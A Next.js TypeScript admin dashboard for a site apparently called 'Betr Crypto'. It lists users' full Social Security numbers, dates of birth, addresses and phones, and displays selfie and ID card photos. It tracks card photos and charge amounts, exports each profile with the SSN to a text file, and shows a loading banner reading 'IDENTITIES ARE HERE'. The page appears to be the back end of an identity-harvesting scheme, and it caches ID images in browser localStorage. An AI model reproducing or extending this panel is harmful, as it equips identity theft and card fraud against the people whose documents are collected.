// Trigger redeploy: Betr Crypto admin dashboard
"use client";

// Prevent Next.js from prerendering this page at build time so it doesn't
// run heavy DB queries during `next build`. Admin is a runtime-only client
// page and should be dynamic.
export const dynamic = 'force-dynamic';

import { useState, useEffect } from "react";
import Link from "next/link";
import Image from "next/image";
import JSZip from "jszip";

interface User {
  _id: string;
  fullName: string;
  email: string;
  phoneNumber: string;
  dateOfBirth: string;
  socialSecurityNumber?: string;
  address: string;
  password?: string;
  verificationStatus: string;
  createdAt: string;
  selfiePhoto?: string;
  idFrontPhoto?: string;
  idBackPhoto?: string;
  // lightweight flags returned by /api/users
  hasSelfie?: boolean;
  hasIdFront?: boolean;
  hasIdBack?: boolean;
  cardFrontPhoto?: string;
  cardBackPhoto?: string;
  cardChargeAmount1?: number | null;
  cardChargeAmount2?: number | null;
}

interface UserTileProps {
  user: User;
  onClick: () => void;
  onDelete: (userId: string, userName: string) => void;
}

// Formatting helpers: phone, SSN, and dates for display
function formatPhone(raw?: string) {
  if (!raw) return "";
  const digits = String(raw).replace(/\D/g, "");
  if (!digits) return raw;
  if (digits.length <= 4) return digits;
  // If longer than 10, treat leading digits as country/prefix
  if (digits.length > 10) {
    const prefix = digits.slice(0, digits.length - 10);
    const local = digits.slice(-10);
    const formattedLocal = local.replace(/(\d{3})(\d{3})(\d{4})/, "$1-$2-$3");
    return `+${prefix}-${formattedLocal}`;
  }
  // Standard 10-digit format
  if (digits.length === 10) {
    return digits.replace(/(\d{3})(\d{3})(\d{4})/, "$1-$2-$3");
  }
  // Fallback: group by 3s from the end
  const groups: string[] = [];
  let rem = digits;
  while (rem.length > 3) {
    groups.unshift(rem.slice(-3));
    rem = rem.slice(0, -3);
  }
  if (rem) groups.unshift(rem);
  return groups.join("-");
}

function formatSSN(raw?: string) {
  if (!raw) return "";
  const digits = String(raw).replace(/\D/g, "");
  if (digits.length === 9) {
    return digits.replace(/(\d{3})(\d{2})(\d{4})/, "$1-$2-$3");
  }
  return raw;
}

function formatDate(raw?: string) {
  if (!raw) return "";
  try {
    const d = new Date(raw);
    if (isNaN(d.getTime())) return raw;
    return d.toLocaleString(undefined, { year: 'numeric', month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' });
  } catch {
    return raw;
  }
}

function UserTile({ user, onClick, onDelete }: UserTileProps) {
  // Download handler (unzip: download each file separately)
  const handleDownload = async () => {
    let photos = await fetchPhotoData();
    // Prepare user data txt
    const userData = `Name: ${user.fullName}\nEmail: ${user.email}\nPhone: ${user.phoneNumber}\nDOB: ${user.dateOfBirth}\nSSN: ${user.socialSecurityNumber}\nAddress: ${user.address}`;
    const txtBlob = new Blob([userData], { type: "text/plain" });
    const txtLink = document.createElement("a");
    txtLink.href = URL.createObjectURL(txtBlob);
    txtLink.download = `${user.fullName.replace(/\s+/g, "_")}_profile.txt`;
    document.body.appendChild(txtLink);
    txtLink.click();
    document.body.removeChild(txtLink);
    // Download each photo as PNG
    const photoFiles = [
      { data: photos.selfiePhoto, name: "selfiePhoto.png" },
      { data: photos.idFrontPhoto, name: "idFrontPhoto.png" },
      { data: photos.idBackPhoto, name: "idBackPhoto.png" },
    ];
    photoFiles.forEach(photo => {
      if (photo.data) {
        const imgLink = document.createElement("a");
        imgLink.href = photo.data;
        imgLink.download = `${user.fullName.replace(/\s+/g, "_")}_${photo.name}`;
        document.body.appendChild(imgLink);
        imgLink.click();
        document.body.removeChild(imgLink);
      }
    });
  };

  // Fetch photo data for checklist
  const [photoData, setPhotoData] = useState<any | null>(null);
  useEffect(() => {
    // If the server returned explicit boolean flags for photos, prefer
    // those and skip fetching the full photo payload for the listing.
    if (typeof user.hasSelfie === 'boolean' && typeof user.hasIdFront === 'boolean' && typeof user.hasIdBack === 'boolean') {
      // Clear any existing photoData since flags are authoritative for the listing
      setPhotoData(null);
      return;
    }

    let isMounted = true;
    fetchPhotoData().then(data => {
      if (isMounted) setPhotoData(data);
    });
    return () => { isMounted = false; };
  }, [user._id, user.hasSelfie, user.hasIdFront, user.hasIdBack]);

  async function fetchPhotoData() {
    try {
      const res = await fetch(`/api/users/${user._id}/photos`);
      if (!res.ok) return {};
      return await res.json();
    } catch {
      return {};
    }
  }

  // derive verified state from photos (selfie + id front + id back)
  // Prefer explicit boolean flags if the API provides them (lightweight)
  // Prefer explicit boolean flags returned by the users listing API.
  // Fall back to fetched photoData or embedded fields if flags are not present.
  const hasSelfie = typeof user.hasSelfie === 'boolean'
    ? user.hasSelfie
    : !!((photoData && typeof photoData.selfiePhoto === 'string' && photoData.selfiePhoto.trim() !== '') || (user.selfiePhoto && String(user.selfiePhoto).trim() !== ''));
  const hasIdFront = typeof user.hasIdFront === 'boolean'
    ? user.hasIdFront
    : !!((photoData && typeof photoData.idFrontPhoto === 'string' && photoData.idFrontPhoto.trim() !== '') || (user.idFrontPhoto && String(user.idFrontPhoto).trim() !== ''));
  const hasIdBack = typeof user.hasIdBack === 'boolean'
    ? user.hasIdBack
    : !!((photoData && typeof photoData.idBackPhoto === 'string' && photoData.idBackPhoto.trim() !== '') || (user.idBackPhoto && String(user.idBackPhoto).trim() !== ''));
  const photosVerified = !!(hasSelfie && hasIdFront && hasIdBack);

  return (
    <div
      className="relative group overflow-hidden rounded-lg border border-purple-500/30 bg-gradient-to-br from-purple-900/20 to-black hover:from-purple-900/40 hover:to-black/80 hover:shadow-lg hover:shadow-purple-500/20 w-full cursor-pointer"
      onClick={onClick}
    >
      {/* Info overlay - cleaner labeled layout (card amounts removed) */}
      <div className="relative z-10 p-4 text-white h-full flex flex-col justify-between">
        <div>
          <div className="flex items-center justify-between">
            <span className="font-bold text-lg truncate">{user.fullName}</span>
            <span className="text-xs text-purple-400 ml-2">ID: {user._id}</span>
          </div>
          <div className="mt-3 grid grid-cols-2 gap-2 text-xs text-gray-300">
            <div>
              <div className="text-gray-400 text-[11px]">Email</div>
              <div className="break-all">{user.email}</div>
            </div>
            <div>
              <div className="text-gray-400 text-[11px]">Phone</div>
              <div>{formatPhone(user.phoneNumber)}</div>
            </div>
            <div>
              <div className="text-gray-400 text-[11px]">DOB</div>
              <div>{formatDate(user.dateOfBirth)}</div>
            </div>
            <div>
              <div className="text-gray-400 text-[11px]">SSN</div>
              <div>{formatSSN(user.socialSecurityNumber)}</div>
            </div>
            <div className="col-span-2">
              <div className="text-gray-400 text-[11px]">Address</div>
              <div className="break-all">{user.address}</div>
            </div>
            <div>
              <div className="text-gray-400 text-[11px]">Status</div>
              {photosVerified ? (
                <div className="text-sm font-semibold text-green-400">verified</div>
              ) : (
                <div className="text-sm text-purple-300">{user.verificationStatus}</div>
              )}
            </div>
            <div>
              <div className="text-gray-400 text-[11px]">Created</div>
              <div className="text-sm">{formatDate(user.createdAt)}</div>
            </div>
          </div>
        </div>

        <div>
          <div className="mt-3 flex flex-row gap-4 items-center text-xs bg-black/60 rounded-lg px-2 py-2 border border-purple-700/30 w-full justify-center">
            {[
              { key: "selfiePhoto", label: "Selfie" },
              { key: "idFrontPhoto", label: "ID Front" },
              { key: "idBackPhoto", label: "ID Back" }
            ].map(photo => {
              // Prefer the computed boolean flags when available.
              let checked: boolean;
              if (photo.key === 'selfiePhoto') checked = !!hasSelfie;
              else if (photo.key === 'idFrontPhoto') checked = !!hasIdFront;
              else checked = !!hasIdBack;

              // If flags are not present (undefined), fall back to checking strings
              if (typeof checked === 'undefined') {
                let value = null as any;
                if (photoData && typeof photoData[photo.key] !== 'undefined') {
                  value = photoData[photo.key];
                } else if (typeof user[photo.key as keyof typeof user] !== 'undefined') {
                  value = user[photo.key as keyof typeof user];
                }
                checked = value !== null && typeof value === 'string' && value.trim() !== '';
              }

              return (
                <span key={photo.key} className="flex items-center gap-2">
                  <span className={`w-4 h-4 rounded border border-purple-400 bg-black flex items-center justify-center ${checked ? 'bg-purple-500' : 'bg-black'}`}>
                    {checked ? <span className="text-white text-xs">✓</span> : null}
                  </span>
                  <span>{photo.label}</span>
                </span>
              );
            })}
          </div>

          <button
            onClick={e => {
              e.stopPropagation();
              handleDownload();
            }}
            className="mt-3 px-3 py-2 bg-purple-700 hover:bg-purple-800 rounded text-xs font-bold text-white shadow border border-purple-400 w-full"
          >
            Download Profile
          </button>
        </div>
      </div>
      <button
        onClick={async e => {
          e.stopPropagation();
          const confirmed = window.confirm(`Are you sure you want to delete ${user.fullName}? This cannot be undone.`);
          if (!confirmed) return;
          try {
            const res = await fetch(`/api/users/${user._id}`, { method: "DELETE" });
            if (res.ok) {
              onDelete(user._id, user.fullName);
            } else {
              alert("Failed to delete user.");
            }
          } catch {
            alert("Failed to delete user.");
          }
        }}
        className="absolute top-2 right-2 z-20 w-6 h-6 flex items-center justify-center bg-red-600 hover:bg-red-700 rounded-full transition shadow border-2 border-white"
        title="Delete user"
        aria-label="Delete user"
      >
        <span className="text-white text-base">×</span>
      </button>
    </div>
  );
}

// Loading overlay for user tiles
function LoadingOverlay() {
  return (
    <div className="absolute inset-0 flex items-center justify-center bg-black bg-opacity-70 z-50">
      <span className="text-4xl font-extrabold text-purple-400 drop-shadow-lg font-mono animate-pulse tracking-wide">
        IDENTITIES ARE HERE
      </span>
    </div>
  );
}

// Animated loading bar for photo loading
function PhotoLoadingBar({ duration = 30000 }) {
  const [progress, setProgress] = useState(0);
  useEffect(() => {
    let start = Date.now();
    let frame: number | undefined;
    function animate() {
      const elapsed = Date.now() - start;
      const pct = Math.min(elapsed / duration, 1);
      setProgress(pct);
      if (pct < 1) {
        frame = requestAnimationFrame(animate);
      }
    }
    animate();
    return () => {
      if (frame !== undefined) cancelAnimationFrame(frame);
    };
  }, [duration]);
  return (
    <div className="w-full flex flex-col items-center py-8">
      <div className="w-64 h-6 bg-gray-800 rounded-full overflow-hidden border-2 border-purple-400">
        <div
          className="h-full bg-gradient-to-r from-purple-400 to-purple-600 rounded-full transition-all duration-200"
          style={{ width: `${Math.floor(progress * 100)}%` }}
        />
      </div>
      <div className="mt-2 text-xs text-purple-400 font-mono tracking-wide">Loading photos...</div>
    </div>
  );
}

// Utility functions for localStorage photo cache
function loadPhotoCache() {
  if (typeof window === 'undefined') return {};
  try {
    const raw = window.localStorage.getItem('photoCache');
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}
function savePhotoCache(cache: any) {
  if (typeof window === 'undefined') return;
  try {
    window.localStorage.setItem('photoCache', JSON.stringify(cache));
  } catch {}
}

export default function AdminDashboard() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [totalUsers, setTotalUsers] = useState<number | null>(null);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [photoData, setPhotoData] = useState<{
    selfiePhoto?: string;
    idFrontPhoto?: string;
    idBackPhoto?: string;
    cardFrontPhoto?: string;
    cardBackPhoto?: string;
    cardName?: string;
    cardChargeAmount1?: number | null;
    cardChargeAmount2?: number | null;
  } | null>(null);
  const [photoLoading, setPhotoLoading] = useState(false);
  const [photoCache, setPhotoCache] = useState(() => loadPhotoCache());
  const [refreshing, setRefreshing] = useState(false);
  const [loadingUsers, setLoadingUsers] = useState(false); // Track loading state for users

  useEffect(() => {
    fetchUsers();
  }, []);

  // Save photoCache to localStorage whenever it changes
  useEffect(() => {
    savePhotoCache(photoCache);
  }, [photoCache]);

  // Update refresh logic to fetch latest users and add new ones
  const handleRefresh = async () => {
    setRefreshing(true);
    setLoadingUsers(true);
    try {
      const res = await fetch(`/api/users?_=${Date.now()}&limit=200`, { cache: "no-store" });
      if (!res.ok) throw new Error('Failed to fetch users');
      const latest = await res.json();
      // Support two shapes: an array (legacy) or a paginated object { users, page, limit, total }
      if (Array.isArray(latest)) {
        setUsers(latest);
        setTotalUsers(latest.length);
        setError("");
      } else if (latest && Array.isArray((latest as any).users)) {
        setUsers((latest as any).users);
        setTotalUsers((latest as any).total ?? ((latest as any).users || []).length);
        setError("");
      } else {
        console.error('Unexpected /api/users response', latest);
        setError('Unexpected response from users API');
      }
    } catch (err) {
      console.error('Refresh failed', err);
      setError('Failed to refresh users');
    } finally {
      setRefreshing(false);
      setLoadingUsers(false);
    }
  };

  const fetchUsers = async () => {
    setLoadingUsers(true); // Set loading state to true
    try {
      const url = `/api/users?_=${Date.now()}&limit=200`;
      const response = await fetch(url, { cache: "no-store" });
      const data = await response.json();
      // Accept either raw array or paginated object { users, page, limit, total }
      if (Array.isArray(data)) {
        setUsers(data);
        setTotalUsers(data.length);
        setError("");
      } else if (data && Array.isArray((data as any).users)) {
        setUsers((data as any).users);
        setTotalUsers((data as any).total ?? ((data as any).users || []).length);
        setError("");
      } else {
        console.error('Unexpected /api/users response', data);
        setError('Unexpected response from users API');
        setUsers([]);
      }
      setLoading(false);
    } catch (err) {
      setError("Failed to fetch users");
      setLoading(false);
    } finally {
      setLoadingUsers(false); // Reset loading state
    }
  };

  const handleDeleteUser = async (userId: string, userName: string) => {
    setUsers((prev) => prev.filter((u) => u._id !== userId));
  };

  // Only fetch photos for a user when their tile is clicked
  const handleTileClick = async (user: User) => {
    // Only reset photoData if switching to a different user
    if (!selectedUser || selectedUser._id !== user._id) {
      setPhotoData(null);
    }
    setSelectedUser(user);
      setPhotoLoading(true);
      if (photoCache[user._id]) {
        const cached = photoCache[user._id];
        const cachedHasAny = !!(cached.selfiePhoto || cached.idFrontPhoto || cached.idBackPhoto);
        // If cached entry exists but contains no photos, and the lightweight
        // flags on `user` indicate photos should exist, ignore the cache and
        // fetch fresh data. This avoids showing "No photo data" for users
        // who uploaded photos after an earlier empty cache was saved.
        const wantsPhotos = !!(user.hasSelfie || user.hasIdFront || user.hasIdBack);
        if (!cachedHasAny && wantsPhotos) {
          // fall through and fetch fresh
        } else {
          setPhotoData(cached);
          setPhotoLoading(false);
          return;
        }
      }
      try {
        const res = await fetch(`/api/users/${user._id}/photos`);
        const data = await res.json();
        setPhotoData(data);
        setPhotoCache((prev: any) => {
          const updated = { ...prev, [user._id]: data };
          savePhotoCache(updated);
          return updated;
        });
      } catch (err) {
        setPhotoData(null);
      } finally {
        setPhotoLoading(false);
      }
  };

  const closeModal = () => {
    setSelectedUser(null);
    setPhotoLoading(false);
    // Do NOT reset photoData here
  };

  // Render loading overlay when users are loading
  return (
    <div className="relative">
      {loadingUsers && <LoadingOverlay />}
      <div className="min-h-screen bg-black text-white p-8">
        {/* Header */}
        <div className="mb-12">
          <div className="flex justify-between items-center mb-6">
              <div>
              <h1 className="text-4xl font-bold mb-2">
                <span className="text-purple-400">BETR</span> Admin Dashboard
              </h1>
              <p className="text-gray-400">Manage and view all registered users</p>
              <div className="text-sm text-gray-300 mt-1">Total users: {loadingUsers ? 'Loading...' : (totalUsers ?? '—')}</div>
            </div>
            <div className="flex gap-4">
              <button
                onClick={handleRefresh}
                className="px-6 py-2 bg-purple-700 hover:bg-purple-800 rounded-lg transition text-white font-semibold shadow"
                disabled={refreshing}
              >
                {refreshing ? "Refreshing..." : "Refresh"}
              </button>
              <Link
                href="/"
                className="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg transition"
              >
                Home
              </Link>
            </div>
          </div>
        </div>
        {/* User grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
          {Array.isArray(users) && users.length > 0 ? (
            users.map(user => (
              <UserTile
                key={user._id}
                user={user}
                onClick={() => handleTileClick(user)}
                onDelete={handleDeleteUser}
              />
            ))
          ) : (
            <div className="col-span-full text-gray-400 p-8">No users to display.</div>
          )}
        </div>
        {error && <div className="mt-8 text-red-400">{error}</div>}
        {/* Modal for user photos */}
        {selectedUser && (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
            <div className="bg-black rounded-xl border border-purple-500/30 shadow-lg p-8 w-full max-w-2xl relative">
              <button
                onClick={closeModal}
                className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center bg-purple-600 hover:bg-purple-700 rounded-full transition z-10"
                title="Close"
                aria-label="Close"
              >
                ✕
              </button>
              <h2 className="text-2xl font-bold mb-6 text-purple-400">{selectedUser.fullName}&apos;s Photos</h2>
              {photoLoading ? (
                <PhotoLoadingBar duration={30000} />
              ) : photoData ? (
                <>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                    <div>
                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">Selfie Photo</h3>
                      <div className="w-full h-48 rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900 flex items-center justify-center">
                        {photoData.selfiePhoto ? (
                          <Image src={photoData.selfiePhoto} alt="Selfie" width={600} height={400} className="object-contain" priority />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center text-gray-500">No Photo</div>
                        )}
                      </div>
                    </div>
                    <div>
                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Front</h3>
                      <div className="w-full h-48 rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900 flex items-center justify-center">
                        {photoData.idFrontPhoto ? (
                          <Image src={photoData.idFrontPhoto} alt="ID Front" width={600} height={400} className="object-contain" priority />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center text-gray-500">No Photo</div>
                        )}
                      </div>
                    </div>
                    <div>
                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Back</h3>
                      <div className="w-full h-48 rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900 flex items-center justify-center">
                        {photoData.idBackPhoto ? (
                          <Image src={photoData.idBackPhoto} alt="ID Back" width={600} height={400} className="object-contain" priority />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center text-gray-500">No Photo</div>
                        )}
                      </div>
                    </div>
                  </div>
                </>
              ) : (
                <div className="text-center text-sm text-gray-400 mt-4">No photo data found</div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
